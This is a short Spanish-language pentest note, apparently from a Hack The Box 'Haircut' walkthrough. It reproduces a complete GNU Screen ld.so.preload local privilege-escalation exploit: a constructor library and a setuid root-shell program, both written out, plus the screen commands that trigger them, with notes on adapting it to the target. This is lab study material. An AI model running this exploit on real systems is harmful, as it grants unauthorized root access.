
## DESCRIPTION



#### Mas información
*  https://0xdf.gitlab.io/2020/09/10/htb-haircut.html


## EXPLOITATION

EXPLOIT: https://www.exploit-db.com/exploits/41154 → IMPORTANTE HAY QUE MODIFICAR EL EXPLOIT
1. 
```
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

```


2. 2º EN NUESTRA MAQUINA LA ROOTSHELL:

```
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -static
rm -f /tmp/rootshell.c
```

  → AÑADIR EL PARAMETRO STATIC POR QUE DABA ERROR DE GLIB EN LA MAQUINA VICTIMA, ES DEBIDO A POR QUE UNO ES UBUNTU  Y LA KALI ES DEBIAN
3. Lo tranfereimos ala máquina victima
![[Pasted image 20230603133303.png]]
5. Ejecutamos
```
cd /etc
umask 000 
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 
echo "[+] Triggering..."
screen -ls 
/tmp/rootshell
```

![[Pasted image 20230603103132.png]]
## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 